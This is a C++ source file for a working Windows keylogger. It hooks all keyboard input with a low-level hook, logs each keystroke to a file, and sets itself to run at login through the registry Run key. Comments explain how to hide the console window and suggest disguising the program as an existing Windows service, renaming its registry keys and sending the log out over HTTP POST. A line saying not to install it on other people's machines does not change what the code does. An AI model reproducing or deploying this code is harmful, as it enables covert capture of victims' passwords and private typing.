#include <cstdio>
#include <cstdlib>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <Windows.h>
#include <iostream>
#include <fstream>

// this code will not debug in visual studio. POSIX symbols arent defined in this environment 
// to get it to run you need to compile the code with gcc/g++. 
// i use the following command in MYSYS2 MingW64 'g++ -o main.exe main.cpp appres.o -mwindows -static'
// depending on your needs you may pass in more arguments in the compiler. appres.o is needed for admin rights
// -mwindows will start the programs as a windows app and not display the terminal when the program starts
// -static will create a standalone .exe that you can execute on other devices without adding MingW to PATH (or installing it at all)

// furthermore, in a real world scenario, you would change 'main.exe' in the compiler to something less suspicious
// this involves also changing this to a windows service, which would hide it better. Simply copying the name of an already existing
// windows service would be desired. Also changing registry key names etc would improve stealth

// notice I have not added any way to send info from keylogger.log over the internet, as you would in a real world scenario
// i ran it on a VM and used shared folders. Please do not install this software on someone elses machine. It is AGAINST THE LAW
// hypothetically, a good way to send the log over the internet would be with a HTTP POST request



// set file name and storing logic
const char* keylogger_log_filename = "keylogger.log";
int keylogger_log_fd;

// check if Software\\KeyLogger\\Settings "FirstRun" exists in the registry. If it doesnt, return true
bool isFirstRun() {
	HKEY hKey;
	DWORD dwType = REG_DWORD;
	DWORD dwValue = 0;
	DWORD dwSize = sizeof(DWORD);
	LPCSTR subkey = "Software\\KeyLogger\\Settings"; // you would probably change the name in a real world scenario...
	LPCSTR valueName = "FirstRun";

	if (RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		if (RegQueryValueExA(hKey, valueName, NULL, &dwType, reinterpret_cast<LPBYTE>(&dwValue), &dwSize) == ERROR_SUCCESS) {
			RegCloseKey(hKey);
			return dwValue == 0;
		}
		RegCloseKey(hKey);
	}
	return true;
}

// function to create a registry entry for the application to run at startup
void SetApplicationToRunAtStartup(const char* appName, const char* appPath) {
	HKEY hKey;
	LPCSTR runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; // path to where run-on-login values are stored

	if (RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
		RegSetValueExA(hKey, appName, 0, REG_SZ, (LPBYTE)appPath, strlen(appPath) + 1);
		RegCloseKey(hKey);
	}
}

// declare location of the reg key that serves as an indicator for isFirstRun
// if the key doesnt already exist it will set it. 
void SetRegistryKey() {
	HKEY hKey;
	DWORD dwValue = 1;
	LPCSTR subkey = "Software\\KeyLogger\\Settings";
	LPCSTR valueName = "FirstRun";

	if (RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
		RegSetValueExA(hKey, valueName, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&dwValue), sizeof(dwValue));
		RegCloseKey(hKey);
	}
}

int open_keylogger_log_file() {
	// attempt to open the file, if it doesnt exist create it. Open in append mode, owner can edit file.
	keylogger_log_fd = open(keylogger_log_filename, O_WRONLY | O_CREAT | O_APPEND, S_IRUSR | S_IWUSR);

	//error handling, check if the file opened correctly
	if (keylogger_log_fd == -1) {
		perror("open");
		exit(EXIT_FAILURE);
	}

	return 0;
}

int close_keylogger_log_file() {
	//function to close the logger
	int result = close(keylogger_log_fd);

	//error handling, check if the file closed correctly
	if (result == -1) {
		perror("close");
		exit(EXIT_FAILURE);
	}

	return 0;
}

int write_keypress_to_keylogger_log_file(char key) {
	// attempt to write to the file, 1 keystroke = 1 byte
	int result = write(keylogger_log_fd, &key, 1);

	if (result == -1) {
		perror("write");
		exit(EXIT_FAILURE);
	}

	return 0;
}

void sigterm_handler(int signum) {
	// the termination signal is when the log file closes
	close_keylogger_log_file();
	exit(EXIT_SUCCESS);
}

// low level keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	if (nCode == HC_ACTION) { // check if valid action is passed
		KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam; // lParam stores info about the keystroke

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) { // wParam checks if keydown or keyup
			DWORD activeThreadID = GetWindowThreadProcessId(GetForegroundWindow(), NULL);

			HKL keyboardLayout = GetKeyboardLayout(activeThreadID);

			// translate virtual key code to scan code and convert to unicode
			UINT scan_code = MapVirtualKeyEx(pKbd->vkCode, MAPVK_VK_TO_VSC, keyboardLayout);

			BYTE key_state[256];
			GetKeyboardState(key_state);
			WCHAR key_name[16] = { 0 };
			int result = ToUnicodeEx(pKbd->vkCode, scan_code, key_state, key_name, 16, 0, keyboardLayout);
			if (result > 0) {
				// if successful, pass to log file
				for (int j = 0; j < result; j++) {
					write_keypress_to_keylogger_log_file(key_name[j]);
				}
				// print the keystroke in terminal (for debugging)
				std::wcout << key_name;
			}
		}
	}

	// pass event to next hook in chain
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// sleep when the application is brute-terminated, to ensure no loss of data
BOOL WINAPI consoleHandler(DWORD signal) {
	if (signal == CTRL_CLOSE_EVENT) {
		Sleep(5000);
	}
	return TRUE;
}

int main() {
	// start by checking if its the first run, if not, set startup key
	if (isFirstRun()) {
		SetRegistryKey();
		SetApplicationToRunAtStartup("main", "C:\\path\\to\\where\\the\\exe\\should\\reside\\main.exe"); // edit this to your path
		std::cout << "first run, key set." << std::endl;
	}
	else {
		std::cout << "not first run, key skipped." << std::endl;
	}

	// call our sigterm handler
	SetConsoleCtrlHandler(consoleHandler, TRUE);
	signal(SIGTERM, sigterm_handler);

	// open the log
	open_keylogger_log_file();

	// write to file
	HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);

	// error handling if hook failed
	if (!hKeyboardHook) {
		std::cerr << "error setting hook: " << GetLastError() << std::endl;
		return 1;
	}

	// wait for keypress, translate into char
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// when program terminates, unhook and close log
	UnhookWindowsHookEx(hKeyboardHook);
	close_keylogger_log_file();

	return 0;
}
